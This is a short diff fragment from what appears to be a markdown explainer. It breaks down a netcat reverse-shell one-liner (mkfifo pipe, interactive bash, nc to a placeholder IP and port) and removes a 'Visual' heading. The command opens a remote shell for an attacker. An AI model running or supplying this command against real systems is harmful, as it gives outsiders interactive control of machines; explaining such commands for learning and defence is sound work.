@@ -16,4 +16,4 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > t
 - `/bin/bash -i` starts a interactive bash shell
 - `2>&1` combines error messages with normal output
 
-#### Visual
+
